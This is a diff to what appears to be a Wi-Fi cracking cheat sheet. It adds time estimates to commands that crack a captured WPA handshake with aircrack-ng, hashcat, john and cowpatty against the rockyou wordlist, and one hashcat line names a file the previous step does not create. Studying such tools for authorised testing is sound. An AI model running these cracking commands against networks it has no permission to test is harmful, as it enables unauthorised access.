@@ -70,7 +70,7 @@ locate rockyou.txt
 
 aircrack-ng -a2 -b 10:27:F5:66:BE:27 -w rockyou.txt out.cap
 
-0:27:F5:66:BE:27
+(ETA 2 HOURS)
 ```
 #### Or a faster way to crack
 
@@ -82,13 +82,17 @@ aircrack-ng -a2 -b 10:27:F5:66:BE:27 -w rockyou.txt out.cap
 ```text
 hcxpcapngtool -o hash.hc22000 -E wordlist out.cap
 hashcat -m 22000 hc2200.txt rockyou.txt
+
+(ETA 5 MINUTES)
 ```
 
 #### or ....
 
 ```text
 hccap2john out.cap > hc2200.txt
-john --wordlist=rockyou.txt --format=wpapsk hc2200.txt 
+john --wordlist=rockyou.txt --format=wpapsk hc2200.txt
+
+(ETA 5 MINUTES)
 ```
 
 #### or ....
@@ -97,6 +101,8 @@ create a rainbow table and crack with that!
 ```text
 genpmk -f <wordlist> -d precomputed-common -s home
 cowpatty -d precomputed-common -s <ESSID> -r out.cap
+
+(ETA 5 MINUTES - after its been pre-computed)
 ```
 
 https://charlesreid1.com/wiki/John_the_Ripper/WPA
